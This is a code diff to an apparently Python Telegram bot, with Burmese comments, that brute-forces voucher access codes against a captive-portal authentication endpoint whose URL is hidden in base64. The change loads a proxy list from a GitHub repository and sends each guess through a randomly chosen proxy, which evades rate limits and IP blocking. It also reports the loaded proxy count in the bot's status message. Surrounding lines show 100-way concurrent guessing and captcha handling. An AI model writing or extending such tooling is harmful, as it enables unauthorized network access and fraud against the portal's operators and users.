@@ -31,6 +31,7 @@ _connector = None
 CONCURRENCY = 100  # Speed တည်ငြိမ်စေရန် လျှော့ချထားပါသည်
 _voucher_sem = None
 _start_time = time.monotonic()
+proxies_list = []
 
 async def handle(request):
     return web.Response(text="Bot is awake and running 24/7!")
@@ -53,6 +54,20 @@ async def get_file_content(path):
             content = base64.b64decode(data['content']).decode('utf-8')
             return json.loads(content), data['sha']
     return {}, None
+
+async def load_proxies_from_github():
+    url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/proxies.txt"
+    headers = {"Authorization": f"token {GITHUB_TOKEN}"}
+    try:
+        async with session.get(url, headers=headers) as response:
+            if response.status == 200:
+                data = await response.json()
+                content = base64.b64decode(data['content']).decode('utf-8')
+                proxies = [line.strip() for line in content.splitlines() if line.strip()]
+                return proxies
+    except Exception as e:
+        print(f"Proxy Load Error: {e}")
+    return []
 
 async def update_file_content(path, content, sha, message):
     url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{path}"
@@ -390,7 +405,8 @@ async def status(message):
         f"⏱ Uptime: {hours}h {minutes}m {seconds}s\n"
         f"🔍 Active Scans: {active_scans}\n"
         f"✅ Approved Users: {approved_users}\n"
-        f"👥 Sessions Loaded: {len(user_data)}"
+        f"👥 Sessions Loaded: {len(user_data)}\n"
+        f"🌐 Proxies Loaded: {len(proxies_list)}"
     )
 
 @bot.message_handler(commands=['stop'])
@@ -500,7 +516,7 @@ async def run_bruteforce(mode, chat_id, session_url, scan_id, message=None, prog
             async def _check(code):
                 async with _voucher_sem:
                     res = await perform_check(session_url, code, chat_id, scan_id, message=message)
-                    await asyncio.sleep(0.15)  # ဆာဗာ Error မတက်အောင် Delay ထည့်သွင်းထားသည်
+                    await asyncio.sleep(0.15)
                     return res
 
             await asyncio.gather(*[_check(code) for code in batch], return_exceptions=True)
@@ -540,8 +556,10 @@ async def get_session_id(session, session_url, previous_session_id=None):
         return previous_session_id
 
 async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False, message=None):
-    global _connector
+    global _connector, proxies_list
     post_url = base64.b64decode(b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM=').decode()
+
+    proxy = random.choice(proxies_list) if proxies_list else None
 
     response = None
     for _attempt in range(3):
@@ -570,7 +588,10 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
             data = {"accessCode": code, "sessionId": session_id, "apiVersion": 1, "authCode": auth_code}
             headers = {"content-type": "application/json", "user-agent": "Mozilla/5.0"}
             try:
-                async with task_session.post(post_url, json=data, headers=headers) as req:
+                kwargs = {"json": data, "headers": headers}
+                if proxy:
+                    kwargs["proxy"] = proxy
+                async with task_session.post(post_url, **kwargs) as req:
                     response = await req.text()
             except:
                 return
@@ -630,11 +651,13 @@ async def Varify_Captcha(session, session_id, text):
         return None
 
 async def main():
-    global session, _connector
+    global session, _connector, proxies_list
     timeout = aiohttp.ClientTimeout(total=30)
     _connector = aiohttp.TCPConnector(limit=2000, ttl_dns_cache=300, ssl=False)
     session = aiohttp.ClientSession(timeout=timeout, connector=_connector, connector_owner=False)
     try:
+        proxies_list = await load_proxies_from_github()
+        print(f"Loaded {len(proxies_list)} proxies from GitHub.")
         asyncio.create_task(web_server())
         asyncio.create_task(github_update_scheduler())
         await bot.infinity_polling(timeout=20, request_timeout=20)
